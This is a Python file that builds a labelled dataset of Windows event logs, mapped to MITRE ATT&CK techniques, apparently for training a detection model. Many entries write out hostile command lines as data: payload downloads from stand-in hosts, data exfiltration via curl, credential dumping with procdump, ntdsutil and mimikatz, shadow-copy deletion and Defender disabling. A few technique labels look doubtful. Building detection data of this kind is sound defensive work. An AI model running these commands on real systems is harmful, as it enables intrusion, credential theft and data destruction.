import json

# ==========================================
# 1. 準備原始訓練資料 (Raw Data)
# 這裡我為您準備了 10 筆高質量的雙語境資料 (包含惡意與正常)
# 在您的論文中，您可以順著這個格式擴充到 50~100 筆
# ==========================================
training_samples = [
    # --- 正常行為 (Benign) ---
    {
        "log": '{"EventID": 1, "Image": "PING.EXE", "CommandLine": "ping 8.8.8.8", "User": "admin"}',
        "ttp": "None (Benign)",
        "explanation": "This is a normal network diagnostic activity using the ping command. No malicious behavior detected."
    },
    {
        "log": '{"EventID": 1, "Image": "chrome.exe", "CommandLine": "chrome.exe --type=renderer", "User": "user01"}',
        "ttp": "None (Benign)",
        "explanation": "Standard web browser process execution. This is benign background activity."
    },
    {
        "log": '{"EventID": 4624, "LogonType": 5, "User": "NT AUTHORITY\\\\SYSTEM"}',
        "ttp": "None (Benign)",
        "explanation": "Routine system service logon event. This is expected behavior within the Windows operating system."
    },

    # --- 惡意攻擊 (Malicious) ---
    {
        "log": '{"EventID": 1, "Image": "powershell.exe", "CommandLine": "-nop -w hidden -EncodedCommand JABzAD0ATgBl...", "User": "admin"}',
        "ttp": "T1059.001",
        "explanation": "The attacker executed a Base64 encoded PowerShell command to hide the payload, indicating a defense evasion and execution attempt."
    },
    {
        "log": '{"EventID": 1, "Image": "procdump.exe", "CommandLine": "procdump.exe -accepteula -ma lsass.exe lsass.dmp"}',
        "ttp": "T1003.001",
        "explanation": "The attacker used Sysinternals Procdump to extract credential material from the LSASS process memory."
    },
    {
        "log": '{"EventID": 4625, "LogonType": 3, "FailureReason": "Unknown user name or bad password.", "Count": "15"}',
        "ttp": "T1110.001",
        "explanation": "Multiple failed logon attempts detected within a short timeframe, indicating a password guessing or brute force attack."
    },
    {
        "log": '{"EventID": 1, "Image": "schtasks.exe", "CommandLine": "schtasks /create /tn \\"Updater\\" /tr \\"C:\\Temp\\malware.exe\\" /sc onstart"}',
        "ttp": "T1053.005",
        "explanation": "A scheduled task was created to execute an unauthorized binary upon system startup, establishing persistence."
    },
    {
        "log": '{"EventID": 1, "Image": "certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f http://bad.com/payload.exe"}',
        "ttp": "T1105",
        "explanation": "Certutil, a legitimate Windows tool, is being abused to download a remote payload, indicating ingress tool transfer."
    },
    {
        "log": '{"EventID": 1, "Image": "wevtutil.exe", "CommandLine": "wevtutil cl Security"}',
        "ttp": "T1070.001",
        "explanation": "The Windows Event Utility was used to clear the Security event log, a common technique to cover tracks and remove indicators of compromise."
    },
    {
        "log": '{"EventID": 1, "Image": "vssadmin.exe", "CommandLine": "vssadmin.exe delete shadows /all /quiet"}',
        "ttp": "T1070.004",
        "explanation": "The Volume Shadow Copy service was manipulated to delete backup shadows, preventing system recovery, often preceding ransomware encryption."
    },


# ==========================================
    # 🟢 新增：正常系統與管理行為 (抗干擾訓練)
    # ==========================================
    {
        "log": '{"EventID": 1, "Image": "ipconfig.exe", "CommandLine": "ipconfig /all", "User": "IT_Admin"}',
        "ttp": "None (Benign)",
        "explanation": "IT administrator executing network configuration check. This is a normal administrative task."
    },
    {
        "log": '{"EventID": 1, "Image": "WINWORD.EXE", "CommandLine": "\\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\\" /n", "User": "user02"}',
        "ttp": "None (Benign)",
        "explanation": "Standard launch of Microsoft Word by an end user. No suspicious child processes or parameters detected."
    },
    {
        "log": '{"EventID": 1, "Image": "GoogleUpdate.exe", "CommandLine": "GoogleUpdate.exe /c", "User": "SYSTEM"}',
        "ttp": "None (Benign)",
        "explanation": "Routine background execution of the Google Chrome updater service running under system privileges."
    },
    {
        "log": '{"EventID": 1, "Image": "w32tm.exe", "CommandLine": "w32tm /resync", "User": "SYSTEM"}',
        "ttp": "None (Benign)",
        "explanation": "System time synchronization process executed by the Windows Time Service."
    },
    {
        "log": '{"EventID": 1, "Image": "bitsadmin.exe", "CommandLine": "bitsadmin /list", "User": "admin"}',
        "ttp": "None (Benign)",
        "explanation": "Administrator checking the status of Background Intelligent Transfer Service (BITS) jobs. Normal system monitoring."
    },

    # ==========================================
    # 🔴 新增：各式進階惡意攻擊 (多樣化 TTP 訓練)
    # ==========================================
    {
        "log": '{"EventID": 1, "Image": "net.exe", "CommandLine": "net user backdoor_admin P@ssw0rd123! /add", "User": "SYSTEM"}',
        "ttp": "T1136.001",
        "explanation": "Adversary created a new local user account to maintain persistence on the compromised host."
    },
    {
        "log": '{"EventID": 1, "Image": "net.exe", "CommandLine": "net localgroup administrators backdoor_admin /add", "User": "SYSTEM"}',
        "ttp": "T1098",
        "explanation": "Account manipulation detected. The attacker added a previously created backdoor account to the local Administrators group for privilege escalation."
    },
    {
        "log": '{"EventID": 1, "Image": "wmic.exe", "CommandLine": "wmic process call create \\"cmd.exe /c start malware.exe\\""}',
        "ttp": "T1047",
        "explanation": "Windows Management Instrumentation (WMI) was abused to spawn a malicious process, bypassing standard process execution tracking."
    },
    {
        "log": '{"EventID": 1, "Image": "powershell.exe", "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring $true", "User": "admin"}',
        "ttp": "T1562.001",
        "explanation": "Attacker executed a PowerShell command to disable Windows Defender Real-time Monitoring, attempting to impair system defenses."
    },
    {
        "log": '{"EventID": 1, "Image": "svchost.exe", "CommandLine": "svchost.exe -k netsvcs", "CurrentDirectory": "C:\\Users\\Public\\Downloads\\"}',
        "ttp": "T1036.005",
        "explanation": "Masquerading detected. A process named svchost.exe was executed from a non-standard, public directory instead of System32."
    },
    {
        "log": '{"EventID": 1, "Image": "systeminfo.exe", "CommandLine": "systeminfo", "User": "guest"}',
        "ttp": "T1082",
        "explanation": "Execution of systeminfo by an unprivileged user suggests System Information Discovery, commonly used in early reconnaissance phases."
    },
    {
        "log": '{"EventID": 1, "Image": "whoami.exe", "CommandLine": "whoami /all", "User": "guest"}',
        "ttp": "T1033",
        "explanation": "Adversary used whoami to discover the current user context and privilege levels on the compromised system."
    },
    {
        "log": '{"EventID": 1, "Image": "netstat.exe", "CommandLine": "netstat -ano", "User": "guest"}',
        "ttp": "T1049",
        "explanation": "System Network Connections Discovery. The attacker is mapping active network connections and listening ports to identify potential lateral movement targets."
    },
    {
        "log": '{"EventID": 1, "Image": "powershell.exe", "CommandLine": "Invoke-WebRequest -Uri http://malicious-c2.com/payload.exe -OutFile C:\\Temp\\payload.exe"}',
        "ttp": "T1105",
        "explanation": "Ingress Tool Transfer. The attacker used PowerShell's Invoke-WebRequest cmdlet to download a malicious payload from an external C2 server."
    },
    {
        "log": '{"EventID": 1, "Image": "rundll32.exe", "CommandLine": "rundll32.exe javascript:\\"\\\\..\\\\mshtml,RunHTMLApplication \\";document.write();GetObject(\\"script:http://badsite.com/payload.sct\\")\\""}',
        "ttp": "T1218.011",
        "explanation": "System Binary Proxy Execution. Rundll32 was abused to execute a remote malicious script, bypassing application whitelisting."
    },
    {
        "log": '{"EventID": 1, "Image": "findstr.exe", "CommandLine": "findstr /si password *.xml *.txt *.ini", "CurrentDirectory": "C:\\"}',
        "ttp": "T1552.001",
        "explanation": "Attacker is searching the file system for unsecured files containing passwords or sensitive credential information."
    },
    {
        "log": '{"EventID": 1, "Image": "curl.exe", "CommandLine": "curl -X POST -d @C:\\Temp\\stolen_data.zip http://192.168.100.50:8080/upload"}',
        "ttp": "T1048.003",
        "explanation": "Data Exfiltration over Alternative Protocol. The native Windows curl utility is being used to upload stolen archived data to an external server."
    },
    {
        "log": '{"EventID": 1, "Image": "ntdsutil.exe", "CommandLine": "ntdsutil \\"ac i ntds\\" \\"ifm\\" \\"create full c:\\temp\\" q q", "User": "Domain_Admin"}',
        "ttp": "T1003.003",
        "explanation": "OS Credential Dumping. ntdsutil is being abused to create a copy of the Active Directory database (NTDS.dit) for offline password hash extraction."
    },
    {
        "log": '{"EventID": 1, "Image": "attrib.exe", "CommandLine": "attrib +h +s C:\\Windows\\Temp\\mimikatz.exe"}',
        "ttp": "T1564.001",
        "explanation": "Hide Artifacts. The attacker is modifying file attributes to hide a malicious executable as a hidden system file to evade visual detection."
    },
    {
        "log": '{"EventID": 1, "Image": "reg.exe", "CommandLine": "reg add \\"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\" /v Debugger /t REG_SZ /d \\"c:\\windows\\system32\\cmd.exe\\""}',
        "ttp": "T1546.008",
        "explanation": "Accessibility Features Abuse. The registry is modified to launch a command shell instead of Sticky Keys (sethc.exe), establishing a pre-authentication backdoor."
    },
# ==========================================
    # 🟢 新增：正常系統與管理行為 (第 31-35 筆)
    # ==========================================
    {
        "log": '{"EventID": 4624, "LogonType": 10, "IpAddress": "10.0.0.50", "User": "IT_Admin"}',
        "ttp": "None (Benign)",
        "explanation": "A successful Remote Desktop Protocol (RDP) logon by an IT administrator. This is considered normal remote management activity."
    },
    {
        "log": '{"EventID": 1, "Image": "msiexec.exe", "CommandLine": "msiexec.exe /i \\"C:\\Users\\user01\\Downloads\\software_installer.msi\\" /quiet", "User": "user01"}',
        "ttp": "None (Benign)",
        "explanation": "Standard silent installation of a software package using the Windows Installer service."
    },
    {
        "log": '{"EventID": 1, "Image": "gpupdate.exe", "CommandLine": "gpupdate.exe /force", "User": "SYSTEM"}',
        "ttp": "None (Benign)",
        "explanation": "A routine forced update of Active Directory Group Policy settings on the endpoint."
    },
    {
        "log": '{"EventID": 1, "Image": "MpCmdRun.exe", "CommandLine": "\\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\\" -Scan -ScanType 1", "User": "SYSTEM"}',
        "ttp": "None (Benign)",
        "explanation": "Windows Defender executing a scheduled quick scan. This is a critical benign security process."
    },
    {
        "log": '{"EventID": 5140, "ShareName": "\\\\\\\\SERVER01\\\\Public", "IpAddress": "192.168.1.100", "User": "user02"}',
        "ttp": "None (Benign)",
        "explanation": "A user accessed a legitimate network file share. No anomalous access patterns detected."
    },

    # ==========================================
    # 🔴 新增：各式進階惡意攻擊 (第 36-50 筆)
    # ==========================================
    {
        "log": '{"EventID": 1, "Image": "netsh.exe", "CommandLine": "netsh advfirewall set allprofiles state off", "User": "admin"}',
        "ttp": "T1562.004",
        "explanation": "Impair Defenses. The attacker disabled the Windows Defender Firewall across all profiles to allow unrestricted inbound/outbound communication."
    },
    {
        "log": '{"EventID": 1, "Image": "reg.exe", "CommandLine": "reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v \\"Backdoor\\" /t REG_SZ /d \\"C:\\Temp\\malware.exe\\" /f"}',
        "ttp": "T1547.001",
        "explanation": "Registry Run Keys. The adversary modified the current user's Run registry key to ensure malware executes automatically upon user logon."
    },
    {
        "log": '{"EventID": 1, "Image": "sc.exe", "CommandLine": "sc create \\"WinUpdateSvc\\" binPath= \\"C:\\Windows\\Temp\\backdoor.exe\\" start= auto", "User": "SYSTEM"}',
        "ttp": "T1543.003",
        "explanation": "Create or Modify System Process. The attacker created a new Windows service configured to start automatically, establishing system-level persistence."
    },
    {
        "log": '{"EventID": 8, "SourceImage": "C:\\Temp\\injector.exe", "TargetImage": "C:\\Windows\\System32\\explorer.exe", "StartAddress": "0x00000000000B0000"}',
        "ttp": "T1055",
        "explanation": "Process Injection. A suspicious process (injector.exe) is allocating memory and creating a thread within the legitimate explorer.exe process to evade detection."
    },
    {
        "log": '{"EventID": 1, "Image": "wmic.exe", "CommandLine": "wmic /node:192.168.1.200 process call create \\"powershell.exe -c IEX(New-Object Net.WebClient).DownloadString(\'http://bad.com/payload.ps1\')\\""}',
        "ttp": "T1047",
        "explanation": "Lateral Movement via WMI. The attacker used Windows Management Instrumentation to execute a malicious payload on a remote network node."
    },
    {
        "log": '{"EventID": 7045, "ServiceName": "PSEXESVC", "ImagePath": "C:\\Windows\\PSEXESVC.exe", "User": "SYSTEM"}',
        "ttp": "T1569.002",
        "explanation": "Service Execution. The installation of the PsExec service (PSEXESVC) indicates potential lateral movement or remote code execution by an adversary."
    },
    {
        "log": '{"EventID": 1, "Image": "net.exe", "CommandLine": "net group \\"Domain Admins\\" /domain", "User": "guest"}',
        "ttp": "T1069.002",
        "explanation": "Domain Groups Discovery. An unprivileged user is attempting to enumerate the members of the highly privileged Domain Admins group."
    },
    {
        "log": '{"EventID": 1, "Image": "nltest.exe", "CommandLine": "nltest /domain_trusts", "User": "guest"}',
        "ttp": "T1482",
        "explanation": "Domain Trust Discovery. The adversary is using nltest to identify domain and forest trusts, gathering intelligence for subsequent lateral movement."
    },
    {
        "log": '{"EventID": 1, "Image": "bitsadmin.exe", "CommandLine": "bitsadmin /transfer myjob /download /priority high http://malicious-c2.com/payload.exe C:\\Temp\\payload.exe"}',
        "ttp": "T1197",
        "explanation": "BITS Jobs. The attacker abused the Background Intelligent Transfer Service to download a payload, utilizing a trusted OS mechanism to evade firewall restrictions."
    },
    {
        "log": '{"EventID": 1, "Image": "fodhelper.exe", "CommandLine": "C:\\Windows\\System32\\fodhelper.exe", "ParentImage": "C:\\Temp\\malware.exe"}',
        "ttp": "T1548.002",
        "explanation": "Bypass User Account Control. Execution of fodhelper.exe by a non-standard parent process indicates an attempt to bypass UAC to gain elevated privileges."
    },
    {
        "log": '{"EventID": 4662, "ObjectName": "domainDNS", "Properties": "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2", "User": "COMPROMISED_USER"}',
        "ttp": "T1003.006",
        "explanation": "DCSync Attack. A user account requested directory replication permissions (Replicating Directory Changes All), attempting to dump credential hashes directly from the Domain Controller."
    },
    {
        "log": '{"EventID": 1, "Image": "nslookup.exe", "CommandLine": "nslookup 68656c6c6f20776f726c64.bad-domain.com", "User": "user01"}',
        "ttp": "T1048.003",
        "explanation": "Exfiltration Over Alternative Protocol. Anomalous DNS queries containing long hexadecimal subdomains, strongly indicating data exfiltration via DNS tunneling."
    },
    {
        "log": '{"EventID": 1, "Image": "powershell.exe", "CommandLine": "powershell.exe -Command \\"(Get-Item C:\\Temp\\malware.exe).LastWriteTime = \'01/01/2015 12:00:00\'\\""}',
        "ttp": "T1070.006",
        "explanation": "Timestomp. The attacker modified the file timestamps of a malicious executable to make it appear as an old, benign system file, complicating forensic analysis."
    },
    {
        "log": '{"EventID": 1, "Image": "powershell.exe", "CommandLine": "powershell.exe -Command \\"while($true){ $keys = [System.Windows.Forms.SendKeys]::Flush(); ... }\\""}',
        "ttp": "T1056.001",
        "explanation": "Keylogging. A PowerShell script is running in an infinite loop attempting to capture keystrokes, indicating credential harvesting."
    },
    {
        "log": '{"EventID": 1, "Image": "wsmprovhost.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "User": "admin"}',
        "ttp": "T1021.006",
        "explanation": "Windows Remote Management. Execution of the WinRM provider host process (wsmprovhost.exe) suggests an adversary is using PowerShell Remoting for lateral movement."
    },
# ==========================================
    # 🟢 新增：正常系統與進階管理行為 (第 51-55 筆)
    # ==========================================
    {
        "log": '{"EventID": 1, "Image": "mmc.exe", "CommandLine": "\\"C:\\Windows\\System32\\mmc.exe\\" \\"C:\\Windows\\System32\\dsa.msc\\"", "User": "IT_Admin"}',
        "ttp": "None (Benign)",
        "explanation": "IT administrator launching Active Directory Users and Computers (dsa.msc) via the Microsoft Management Console. This is a standard administrative action."
    },
    {
        "log": '{"EventID": 1, "Image": "TiWorker.exe", "CommandLine": "C:\\Windows\\winsxs\\amd64_microsoft-windows-servicingstack...\\TiWorker.exe -embedding", "User": "SYSTEM"}',
        "ttp": "None (Benign)",
        "explanation": "Windows Modules Installer Worker executing system updates in the background. Highly prevalent benign activity."
    },
    {
        "log": '{"EventID": 1, "Image": "powershell.exe", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File \\"C:\\Scripts\\DailyBackup.ps1\\"", "User": "Service_Backup"}',
        "ttp": "None (Benign)",
        "explanation": "Execution of a known, scheduled backup PowerShell script by a dedicated service account."
    },
    {
        "log": '{"EventID": 3, "Image": "C:\\Windows\\System32\\spoolsv.exe", "DestinationIp": "192.168.10.15", "DestinationPort": 9100}',
        "ttp": "None (Benign)",
        "explanation": "Print Spooler service communicating with a network printer over standard port 9100."
    },
    {
        "log": '{"EventID": 1, "Image": "Taskmgr.exe", "CommandLine": "\\"C:\\Windows\\System32\\Taskmgr.exe\\" /4", "User": "user01"}',
        "ttp": "None (Benign)",
        "explanation": "User initiated the Windows Task Manager. No malicious intent observed."
    },

    # ==========================================
    # 🔴 新增：APT 進階攻擊手法 (第 56-70 筆)
    # ==========================================
    {
        "log": '{"EventID": 1, "Image": "powershell.exe", "CommandLine": "Remove-Item (Get-PSReadLineOption).HistorySavePath", "User": "admin"}',
        "ttp": "T1070.003",
        "explanation": "Clear Command History. The attacker is deleting the PowerShell execution history file to remove forensic evidence of their activities."
    },
    {
        "log": '{"EventID": 1, "Image": "Rubeus.exe", "CommandLine": "Rubeus.exe kerberoast /outfile:hashes.txt", "User": "user02"}',
        "ttp": "T1558.003",
        "explanation": "Kerberoasting. The adversary is using Rubeus to request service tickets for Active Directory accounts with SPNs, aiming to crack the password hashes offline."
    },
    {
        "log": '{"EventID": 1, "Image": "eventvwr.exe", "CommandLine": "eventvwr.exe", "ParentImage": "C:\\Temp\\malware.exe"}',
        "ttp": "T1548.002",
        "explanation": "Bypass User Account Control. An undocumented registry hijack via eventvwr.exe is likely being used to execute a payload with elevated privileges."
    },
    {
        "log": '{"EventID": 1, "Image": "powershell.exe", "CommandLine": "powershell.exe -w hidden -c \\"IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/malicious/repo/main/payload.ps1\')\\""}',
        "ttp": "T1102",
        "explanation": "Web Service. The attacker is abusing a legitimate web service (GitHub) to host and download malicious payloads, evading reputation-based network filtering."
    },
    {
        "log": '{"EventID": 1, "Image": "mimikatz.exe", "CommandLine": "mimikatz.exe \\"sekurlsa::pth /user:Administrator /domain:CGA_DOMAIN /ntlm:1234567890abcdef1234567890abcdef /run:cmd.exe\\" \\"exit\\""}',
        "ttp": "T1550.002",
        "explanation": "Pass the Hash. The attacker is using extracted NTLM hashes to authenticate and execute commands as another user without knowing the plaintext password."
    },
    {
        "log": '{"EventID": 1, "Image": "cipher.exe", "CommandLine": "cipher.exe /w:C:\\", "User": "admin"}',
        "ttp": "T1070.004",
        "explanation": "File Deletion. The adversary is using the native Windows cipher utility to overwrite deleted data in free disk space, preventing forensic recovery of deleted malicious tools."
    },
    {
        "log": '{"EventID": 1, "Image": "powershell.exe", "CommandLine": "Compress-Archive -Path C:\\Users\\*\\Documents\\*.docx -DestinationPath C:\\Temp\\exfil_data.zip"}',
        "ttp": "T1119",
        "explanation": "Automated Collection. A script is being used to automatically search for and compress sensitive documents (.docx) into an archive for subsequent exfiltration."
    },
    {
        "log": '{"EventID": 3, "Image": "C:\\Windows\\System32\\scp.exe", "DestinationIp": "203.0.113.50", "DestinationPort": 22}',
        "ttp": "T1048",
        "explanation": "Exfiltration Over Alternative Protocol. The native scp (Secure Copy) tool is initiating outbound connections, likely transferring stolen data over an encrypted SSH tunnel."
    },
    {
        "log": '{"EventID": 1, "Image": "tshark.exe", "CommandLine": "tshark -i 1 -w C:\\Temp\\capture.pcap", "User": "admin"}',
        "ttp": "T1040",
        "explanation": "Network Sniffing. The adversary is running a packet capture utility to monitor network traffic and potentially harvest unencrypted credentials or sensitive data."
    },
    {
        "log": '{"EventID": 1, "Image": "powershell.exe", "CommandLine": "New-ItemProperty -Path \\"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe\\" -Name \\"MonitorProcess\\" -Value \\"C:\\Temp\\dumpper.exe\\""}',
        "ttp": "T1134.004",
        "explanation": "Access Token Manipulation. The attacker is tampering with the SilentProcessExit registry key to maintain persistence and potentially dump LSASS memory when the process terminates."
    },
    {
        "log": '{"EventID": 1, "Image": "wmic.exe", "CommandLine": "wmic shadowcopy delete", "User": "SYSTEM"}',
        "ttp": "T1490",
        "explanation": "Inhibit System Recovery. WMI is being abused to delete volume shadow copies, a hallmark behavior of ransomware attempting to prevent data restoration."
    },
    {
        "log": '{"EventID": 1, "Image": "cmd.exe", "CommandLine": "cmd.exe /c ren C:\\Users\\Public\\Documents\\*.pdf *.encrypted", "ParentImage": "C:\\Temp\\ransomware.exe"}',
        "ttp": "T1486",
        "explanation": "Data Encrypted for Impact. A script or executable is systematically renaming files with an .encrypted extension, strongly indicating an active ransomware infection."
    },
    {
        "log": '{"EventID": 1, "Image": "arp.exe", "CommandLine": "arp -a", "User": "guest"}',
        "ttp": "T1016",
        "explanation": "System Network Configuration Discovery. The arp utility is being used to map the local network cache, identifying other devices on the subnet for potential lateral movement."
    },
    {
        "log": '{"EventID": 1, "Image": "powershell.exe", "CommandLine": "Set-Service -Name \\"WinDefend\\" -StartupType Disabled"}',
        "ttp": "T1562.001",
        "explanation": "Impair Defenses. The adversary executed a command to permanently disable the Windows Defender service from starting, attempting to completely blind endpoint security."
    },
    {
        "log": '{"EventID": 1, "Image": "vssadmin.exe", "CommandLine": "vssadmin Resize ShadowStorage /For=C: /On=C: /MaxSize=401MB"}',
        "ttp": "T1490",
        "explanation": "Inhibit System Recovery. Modifying the Shadow Copy storage size limit to a very small threshold, effectively destroying existing backups to facilitate ransomware impact."
    },
# ==========================================
    # 🟢 新增：進階系統管理與開發行為 (第 71-75 筆)
    # ==========================================
    {
        "log": '{"EventID": 1, "Image": "docker.exe", "CommandLine": "docker run -d -p 80:80 nginx", "User": "dev_user"}',
        "ttp": "None (Benign)",
        "explanation": "A developer is starting a standard NGINX container using Docker. Normal development or DevOps activity."
    },
    {
        "log": '{"EventID": 1, "Image": "ssh.exe", "CommandLine": "ssh admin@192.168.50.10", "User": "IT_Admin"}',
        "ttp": "None (Benign)",
        "explanation": "IT Administrator initiating an outbound Secure Shell (SSH) connection for legitimate remote server management."
    },
    {
        "log": '{"EventID": 1, "Image": "sdelete.exe", "CommandLine": "sdelete.exe -p 3 C:\\Temp\\old_backup.zip", "User": "admin"}',
        "ttp": "None (Benign)",
        "explanation": "Secure deletion of an old backup file using Sysinternals SDelete by an administrator. Legitimate use of a secure wiping tool."
    },
    {
        "log": '{"EventID": 1, "Image": "powershell.exe", "CommandLine": "Get-EventLog -LogName Security -Newest 100", "User": "SOC_Analyst"}',
        "ttp": "None (Benign)",
        "explanation": "A security analyst querying the Windows Security Event Log for routine monitoring and threat hunting."
    },
    {
        "log": '{"EventID": 3, "Image": "C:\\Program Files\\OpenVPN\\bin\\openvpn.exe", "DestinationIp": "198.51.100.22", "DestinationPort": 1194, "Protocol": "udp"}',
        "ttp": "None (Benign)",
        "explanation": "Legitimate execution of the OpenVPN client connecting to a corporate VPN gateway over UDP port 1194."
    },

    # ==========================================
    # 🔴 新增：無文件攻擊與進階隱蔽手法 (第 76-90 筆)
    # ==========================================
    {
        "log": '{"EventID": 1, "Image": "regsvr32.exe", "CommandLine": "regsvr32.exe /s /n /u /i:http://malicious-server.com/payload.sct scrobj.dll"}',
        "ttp": "T1218.010",
        "explanation": "System Binary Proxy Execution. The attacker abused regsvr32.exe to fetch and execute a remote COM scriptlet (.sct), bypassing application whitelisting."
    },
    {
        "log": '{"EventID": 1, "Image": "powershell.exe", "CommandLine": "Set-WmiInstance -Class __EventFilter -Name \\"BackdoorFilter\\" -Query \\"SELECT * FROM __InstanceModificationEvent WITHIN 60...\\""}',
        "ttp": "T1546.015",
        "explanation": "WMI Event Subscription. The adversary established a highly stealthy persistence mechanism by creating a WMI event filter to trigger a payload when specific conditions are met."
    },
    {
        "log": '{"EventID": 1, "Image": "cmd.exe", "CommandLine": "type C:\\Temp\\malware.exe > C:\\Windows\\System32\\calc.exe:hidden.exe"}',
        "ttp": "T1564.004",
        "explanation": "Hide Artifacts via Alternate Data Streams (ADS). The attacker is hiding a malicious payload inside an alternate data stream of a legitimate Windows binary to evade file-based scanning."
    },
    {
        "log": '{"EventID": 1, "Image": "pcalua.exe", "CommandLine": "pcalua.exe -a C:\\Temp\\malware.exe"}',
        "ttp": "T1202",
        "explanation": "Indirect Command Execution. The Program Compatibility Assistant (pcalua.exe) is being abused to execute a malicious payload, acting as a proxy to evade defensive monitoring."
    },
    {
        "log": '{"EventID": 1, "Image": "copy.exe", "CommandLine": "copy C:\\Windows\\System32\\cmd.exe C:\\Temp\\svchost.exe"}',
        "ttp": "T1036.003",
        "explanation": "Masquerading. The attacker copied the command prompt executable and renamed it to svchost.exe to blend in with normal system processes."
    },
    {
        "log": '{"EventID": 1, "Image": "powershell.exe", "CommandLine": "powershell.exe -c \\"$pw = ConvertTo-SecureString \'P@ssw0rd123!\' -AsPlainText -Force; New-LocalUser -Name \'SysAdmin\' -Password $pw\\""}',
        "ttp": "T1136.001",
        "explanation": "Create Account. The adversary utilized PowerShell to create a new local user account, likely to maintain persistent access to the compromised machine."
    },
    {
        "log": '{"EventID": 1, "Image": "wmic.exe", "CommandLine": "wmic useraccount where name=\\"SysAdmin\\" set passwordexpires=false"}',
        "ttp": "T1098",
        "explanation": "Account Manipulation. The attacker modified the newly created backdoor account to ensure its password never expires, solidifying persistent access."
    },
    {
        "log": '{"EventID": 1, "Image": "cmd.exe", "CommandLine": "echo F | xcopy C:\\SAM_backup C:\\Temp\\SAM /Y /Q"}',
        "ttp": "T1003.002",
        "explanation": "OS Credential Dumping: Security Account Manager. The attacker is copying a backup of the SAM hive to a temporary directory for offline password hash extraction."
    },
    {
        "log": '{"EventID": 11, "TargetFilename": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", "CreationUtcTime": "2023-10-27 10:00:00"}',
        "ttp": "T1055.012",
        "explanation": "Process Hollowing. Sysmon Event ID 11 (File Create) showing an unexpected drop or modification of WmiPrvSE.exe, highly indicative of process hollowing or replacement."
    },
    {
        "log": '{"EventID": 1, "Image": "powershell.exe", "CommandLine": "Import-Module ActiveDirectory; Get-ADComputer -Filter * -Properties IPv4Address | Select Name, IPv4Address"}',
        "ttp": "T1018",
        "explanation": "Remote System Discovery. The attacker used the ActiveDirectory PowerShell module to enumerate all computers within the domain to identify targets for lateral movement."
    },
    {
        "log": '{"EventID": 1, "Image": "esentutl.exe", "CommandLine": "esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\Temp\\ntds.dit"}',
        "ttp": "T1003.003",
        "explanation": "OS Credential Dumping. The native Windows Extensible Storage Engine utility (esentutl.exe) is being abused to copy the Active Directory database (NTDS.dit) using Volume Shadow Copies."
    },
    {
        "log": '{"EventID": 1, "Image": "icacls.exe", "CommandLine": "icacls C:\\Windows\\Temp\\payload.exe /grant Everyone:F"}',
        "ttp": "T1222.001",
        "explanation": "File and Directory Permissions Modification. The attacker is using icacls to grant full control permissions to everyone for a malicious payload, ensuring it can be executed by any process."
    },
    {
        "log": '{"EventID": 1, "Image": "powershell.exe", "CommandLine": "Disable-NetAdapter -Name \\"Ethernet0\\""}',
        "ttp": "T1529",
        "explanation": "System Shutdown/Reboot. A destructive action where the attacker disables the primary network adapter, attempting to isolate the host or cause a denial of service."
    },
    {
        "log": '{"EventID": 1, "Image": "mshta.exe", "CommandLine": "mshta.exe vbscript:Close(Execute(\\"GetObject(\\"\\"script:http://malicious.com/payload.vbs\\"\\")\\"))"}',
        "ttp": "T1218.005",
        "explanation": "System Binary Proxy Execution. The Microsoft HTML Application host (mshta.exe) is being abused to execute remote VBScript, bypassing application control policies."
    },
    {
        "log": '{"EventID": 3, "Image": "C:\\Temp\\ransomware.exe", "DestinationIp": "149.154.167.91", "DestinationPort": 443, "Protocol": "tcp"}',
        "ttp": "T1071.001",
        "explanation": "Application Layer Protocol. A known malicious executable communicating externally over HTTPS (port 443), highly indicative of Command and Control (C2) traffic, possibly using the Telegram API."
    },
# ==========================================
    # 🟢 新增：正常系統維運與開發行為 (第 91-95 筆)
    # ==========================================
    {
        "log": '{"EventID": 1, "Image": "cleanmgr.exe", "CommandLine": "cleanmgr.exe /sagerun:1", "User": "SYSTEM"}',
        "ttp": "None (Benign)",
        "explanation": "Windows Disk Cleanup utility running a scheduled automated cleanup task. Standard system maintenance."
    },
    {
        "log": '{"EventID": 1, "Image": "msbuild.exe", "CommandLine": "\\"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\MSBuild\\Current\\Bin\\MSBuild.exe\\" C:\\Code\\Project.sln", "User": "dev_user"}',
        "ttp": "None (Benign)",
        "explanation": "A software developer compiling a legitimate Visual Studio solution using MSBuild."
    },
    {
        "log": '{"EventID": 1, "Image": "tracert.exe", "CommandLine": "tracert 8.8.8.8", "User": "IT_Admin"}',
        "ttp": "None (Benign)",
        "explanation": "IT Administrator using the tracert network diagnostic tool to troubleshoot routing issues."
    },
    {
        "log": '{"EventID": 1, "Image": "ServerManager.exe", "CommandLine": "\\"C:\\Windows\\System32\\ServerManager.exe\\"", "User": "admin"}',
        "ttp": "None (Benign)",
        "explanation": "Launch of the Windows Server Manager console for legitimate administrative configuration."
    },
    {
        "log": '{"EventID": 1, "Image": "UpdateNotificationMgr.exe", "CommandLine": "UpdateNotificationMgr.exe", "User": "user01"}',
        "ttp": "None (Benign)",
        "explanation": "Standard background execution of the Windows Update Notification Manager."
    },

    # ==========================================
    # 🔴 新增：終極隱蔽、竊密與破壞 (第 96-110 筆)
    # ==========================================
    {
        "log": '{"EventID": 1, "Image": "control.exe", "CommandLine": "control.exe C:\\Temp\\malicious.cpl"}',
        "ttp": "T1218.002",
        "explanation": "System Binary Proxy Execution. The attacker is executing a malicious Control Panel item (.cpl), which is a disguised DLL, bypassing standard execution controls."
    },
    {
        "log": '{"EventID": 1, "Image": "fltMC.exe", "CommandLine": "fltMC.exe unload WdFilter", "User": "admin"}',
        "ttp": "T1562.001",
